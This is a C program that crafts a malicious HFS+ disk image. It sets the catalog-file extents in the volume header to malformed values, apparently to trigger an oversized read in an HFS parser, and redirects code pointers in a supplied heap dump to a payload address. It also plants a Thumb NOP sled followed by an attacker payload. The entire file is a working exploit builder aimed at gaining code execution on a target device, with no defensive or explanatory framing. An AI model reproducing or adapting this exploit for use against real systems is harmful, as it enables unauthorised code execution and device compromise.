/*
 * Payload at 0x1000
 * Read size 0x80000000
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "HFS.h"
#include "target.h"

#ifndef OSSwapInt32
#define OSSwapInt32 __builtin_bswap32
#endif

int main(int argc, char **argv) {
    
    if (argc < 5) {
        printf("Usage: %s (HFSVolume) (PatchedHFSVolume) (heap dump) (payload)\n", argv[0]);
        return -1;
    }
    
    char *inFile = argv[1];
    char *outFile = argv[2];
    char *memFile = argv[3];
    char *pFile = argv[4];
    
    
    if (!(inFile && outFile && pFile && memFile)) {
        return -1;
    }
    
    size_t len = 0;
    void *buf = 0;
    
    FILE *hfsdisk = fopen(inFile, "r");
    
    if (!hfsdisk) {
        printf("Failed to open %s\n", inFile);
        return -1;
    }
    
    fseek(hfsdisk, 0, SEEK_END);
    len = ftell(hfsdisk);
    fseek(hfsdisk, 0, SEEK_SET);
    
    if (!len) {
        printf("%s was empty\n", inFile);
        fclose(hfsdisk);
        return -1;
    }
    
    //Only work with the first 0x300000 bytes of the disk
    if (len > 0x300000) {
        len = 0x300000;
    }
    
    buf = (void*)malloc(len);
    bzero(buf, len);
    
    size_t read = fread(buf, 1, len, hfsdisk);
    
    if (read != len) {
        printf("Failed to read %s\n", inFile);
        fclose(hfsdisk);
        return -1;
    }
    
    HFSPlusVolumeHeader *hdr = (HFSPlusVolumeHeader*)(buf+0x400);
    
    hdr->catalogFile.extents[0].startBlock = OSSwapInt32(0x0);
    hdr->catalogFile.extents[0].blockCount = OSSwapInt32(0x0);
    hdr->catalogFile.extents[1].startBlock = OSSwapInt32(0x1);
    hdr->catalogFile.extents[1].blockCount = OSSwapInt32(0x80000);
    
    FILE *memFd = fopen(memFile, "r");
    
    if (!memFd) {
        printf("Failed to open memory dump\n");
        return -1;
    }
    
    size_t memLen = 0;
    fseek(memFd, 0, SEEK_END);
    memLen = ftell(memFd);
    fseek(memFd, 0, SEEK_SET);
    
    void *memDumpBuf = (void*)malloc(memLen);
    
    if (!memDumpBuf) {
        return -1;
    }
    
    bzero(memDumpBuf, memLen);
    
    read = fread(memDumpBuf, 1, memLen, memFd);
    
    fclose(memFd);
    
    if (read != memLen) {
        printf("Failed to read full file 0x%zx 0x%zx\n", read, memLen);
        return -1;
    }
    
    for (int i=0; i < 0x2000; i+=0x4) {
        
        if (*(uint32_t*)(memDumpBuf+i) > BASE_ADDR && *(uint32_t*)(memDumpBuf+i) < (BASE_ADDR+TEXT_SIZE)) {
            *(uint32_t*)(memDumpBuf+i) = PAYLOAD_ADDR;
        }
        
    }
    
    FILE *payload = fopen(pFile, "r");
    
    if (!payload) {
        printf("Failed to open payload\n");
        return -1;
    }
    
    fseek(payload, 0, SEEK_END);
    size_t payloadLen = ftell(payload);
    fseek(payload, 0, SEEK_SET);
    
    void *plb = (void*)malloc(payloadLen);
    bzero(plb, payloadLen);
    
    fread(plb, payloadLen, 1, payload);
    
    fclose(payload);
    
    memcpy(buf+0x1000, memDumpBuf, memLen);
    
    //Use a NOP sled into the payload because things can be wacky sometimes
    memcpy(buf+0x1400, plb, payloadLen);
    
    free(plb);
    
    for (int i=0x1000; i < 0x1400; i+=2) {
        *(uint16_t*)(buf+i) = 0xbf00;
    }
    
    FILE *outF = fopen(outFile, "w");
    
    if (!outF) {
        printf("Error opening outFile\n");
        return -1;
    }
    
    size_t written = fwrite(buf, 1, len, outF);
    
    if (written != len) {
        printf("Error writing outFile %zu %zu\n", written, len);
        fclose(outF);
        return -1;
    }
    
    fclose(outF);
    free(buf);
    
    printf("Wrote patched file to %s\n", outFile);
    return 0;
}

